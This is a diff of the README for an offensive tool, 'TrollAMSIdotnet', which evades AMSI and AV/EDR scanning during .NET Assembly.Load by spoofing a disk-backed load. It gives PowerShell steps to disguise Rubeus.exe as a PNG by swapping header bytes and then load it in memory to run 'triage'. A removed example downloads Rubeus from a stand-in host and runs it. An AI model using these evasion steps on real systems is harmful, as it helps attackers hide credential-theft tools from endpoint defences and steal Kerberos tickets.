@@ -1,21 +1,36 @@
 # TrollAMSIdotnet
-TrollAMSI only bypasses powershell's amsi and not the CLR amsi during Assembly.Load(). Was looking for a troll way to do this but seems like already done in the most epic way possible: https://github.com/G0ldenGunSec/SharpTransactedLoad. Read his blog for full details on his ingenious approach to bypassing amsi. G0ldenGunSec's implementation uses easyhook.dll for hooking which inturn requires cody fostura. Due to the proliferated use of both libraries in offensive security projects, they have been signaturized. Decided to re-write the hooking aspect but then realised there's a simple library already created for that: https://github.com/liulilittle/NetHook. Ended up just copy pasting code to create a single .cs file for convenience.
-
+TrollAMSI only bypasses powershell's amsi and not the CLR amsi during Assembly.Load(). Was looking for a troll way to do this but seems like already done in the most epic way possible: https://github.com/G0ldenGunSec/SharpTransactedLoad. Read his blog for full details on his ingenious approach to bypassing amsi. G0ldenGunSec's implementation uses easyhook.dll for hooking which inturn requires cody fostura. Due to the proliferated use of both libraries in offensive security projects, they have been signaturized. Decided to re-write the hooking aspect to make it opsec safer. Ended up just copy pasting code to create a single .cs file for convenience. 
 
 **Note:** Only .cs version released, you can just compile it to an assembly and load it (refer to trollAMSI) 
-  
+
+## Why is this technique so powerful?
+Because even if you bypass amsi, when you any sort of assembly.load, the byte array is scanned during virtualalloc, etc by the AV/EDR. This spoofs a byte array to appear on disk and the AV/EDR will not re-scan the byte array due to unnecessary overhead, since it is already assumed to be scanned when on disk. 
+
+![Image](https://github.com/user-attachments/assets/c893ef11-20a5-455a-a62c-1d6a717884fe)
+
+
 ## Usage 
 ```
-$asm = [TrollAMSIdotnet]::Load(<BYTE_ARRAY_DOWNLOAD>,<ASSEMBLY_NAME>) 
-[string[]]$args = "<ARGUMENT_TO_ASSEMBLY>", "<ARGUMENT_TO_ASSEMBLY>"
-[TrollAMSIdotnet]::Invoke($asm,$args)
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /optimize /out:TrollAmsiDOTNET.dll /target:library TrollAmsiDOTNET.cs > $null
+$MZHeader = [byte[]](0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00)
+$fileBytes = [System.IO.File]::ReadAllBytes("C:\troll\dog.png")
+for ($i = 0; $i -lt 8; $i++) {$fileBytes[$i] = $MZHeader[$i] }
+[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\troll\TrollAmsiDOTNET.dll")) > $null
+#[string[]]$myargs = "triage","/consoleoutfile:C:\troll\hehe.txt"
+[string[]]$myargs = "triage"
+$entryPoint = ([TrollAmsiDOTNET]::SpoofFileLoad($fileBytes,"Rubeus.exe")).EntryPoint
+$entryPoint.Invoke($null, (,$myargs))
+
 ```
 
-## Example 
+## Code to change MZ header to PNG header 
 ```
-$asm = [TrollAMSIdotnet]::Load((New-Object System.Net.WebClient).DownloadData("https://troll.com/Rubeus.exe"),"Rubeus.exe") 
-[string[]]$myargs = "triage", "/consoleoutfile:C:\FILE.txt"
-[TrollAMSIdotnet]::Invoke($asm,$myargs)
+$infile = "C:\troll\Rubeus.exe"
+$outfile = "C:\troll\dog.png"
+$pngMagicBytes = [byte[]](0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A)
+$fileBytes = [System.IO.File]::ReadAllBytes($infile)
+for ($i = 0; $i -lt 8; $i++) {$fileBytes[$i] = $pngMagicBytes[$i] }
+[System.IO.File]::WriteAllBytes($outfile, $fileBytes)
 ```
 
 
